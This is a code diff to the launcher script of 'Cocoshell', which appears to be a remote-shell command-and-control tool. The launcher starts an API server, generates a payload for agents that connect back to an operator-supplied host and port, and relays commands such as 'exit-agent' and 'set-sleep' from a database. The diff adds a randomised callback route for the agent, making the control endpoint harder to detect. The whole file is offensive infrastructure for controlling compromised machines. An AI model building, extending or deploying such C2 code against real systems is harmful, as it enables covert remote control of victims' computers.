@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-import subprocess, time, sqlite3, argparse, os, sys
+import subprocess, time, sqlite3, argparse, os, sys, random, string
 from os.path import exists
 from core.payload import generate
 from core.log import Log
@@ -8,8 +8,12 @@ parser = argparse.ArgumentParser()
 parser.add_argument("-l", "--lhost", help="the ip the agent will connect to")
 parser.add_argument("-p", "--lport", help="the port the agent will connect to (default: 5000)")
 parser.add_argument("-s", "--sleep", help="the amount of seconds the agent waits for the next command (default: 1)")
+parser.add_argument("-r", "--route", help="the api endpoint the agent will connect to")
 parser.add_argument("-v", "--verbose", help="debug messages will be printed to the console", action="store_true")
 args, leftovers = parser.parse_known_args()
+
+letters = string.ascii_lowercase
+route = args.route if args.route is not None else ''.join(random.choice(letters) for i in range(8))
 
 logger = Log(args.verbose)
 
@@ -25,7 +29,7 @@ sleep = args.sleep if args.sleep is not None else 1
 logger.debug("Cocoshell API starting")
 
 api_url = 'http://0.0.0.0:' + lport
-agent_url = 'http://' + lhost + ':' + lport
+agent_url = 'http://' + lhost + ':' + lport + '/' + route
 
 try:
     api_log = open("logs/cocoshell_api.log", "a+")
@@ -34,8 +38,9 @@ except FileNotFoundError:
         f.write('')
     api_log = open("logs/cocoshell_api.log", "a+")
 
-proc = subprocess.Popen(["python3", "core/api.py"], stdout=api_log)
-logger.info("Cocoshell API started on " + api_url)
+proc = subprocess.Popen(["python3", "core/api.py", "-r", route], stdout=api_log)
+logger.info(f"Cocoshell API started on {api_url}")
+logger.info(f"Agent will connect to {agent_url}")
 logger.debug("Connecting to database")
 time.sleep(2.0)
 con = sqlite3.connect("cocoshell.db", check_same_thread=False)
@@ -85,7 +90,7 @@ try:
             waiting_for_result = False
         if (command == "exit-agent"):
             waiting_for_result = False
-            logger.failed("Telling all agents to stop")
+            logger.warning("Telling the agent to quit")
         if ("set-sleep" in command):
             waiting_for_result = False
             sleep_array = command.split("set-sleep")
